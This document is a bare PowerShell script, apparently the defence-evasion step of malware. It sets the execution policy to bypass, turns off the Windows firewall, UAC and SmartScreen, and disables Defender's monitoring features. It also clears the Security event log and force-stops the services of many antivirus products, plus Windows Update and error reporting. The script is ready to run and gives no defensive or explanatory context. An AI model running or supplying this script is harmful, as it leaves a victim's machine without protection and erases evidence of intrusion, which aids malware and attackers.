Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
wevtutil cl Security
Stop-Service -Name "ekrn" -Force
Stop-Service -Name "efwd" -Force
Stop-Service -Name "ekrnEpfw" -Force
Stop-Service -Name "mpssvc" -Force
Stop-Service -Name "MsMpSvc" -Force
Stop-Service -Name "WinDefend" -Force
Stop-Service -Name "AVP" -Force
Stop-Service -Name "McAfeeFramework" -Force
Stop-Service -Name "SAVService" -Force
Stop-Service -Name "NortonSecurity" -Force
Stop-Service -Name "AVASTSvc" -Force
Stop-Service -Name "avgsvc" -Force
Stop-Service -Name "VSSERV" -Force
Stop-Service -Name "PandaAV" -Force
Stop-Service -Name "wscsvc" -Force
Stop-Service -Name "wuauserv" -Force
Stop-Service -Name "WerSvc" -Force
Stop-Service -Name "WinHttpAutoProxySvc" -Force
Stop-Service -Name "Browser" -Force
Stop-Service -Name "DPS" -Force
Stop-Service -Name "sppsvc" -Force
Stop-Service -Name "iphlpsvc" -Force
Stop-Service -Name "TrkWks" -Force
Stop-Service -Name "wmiApSrv" -Force
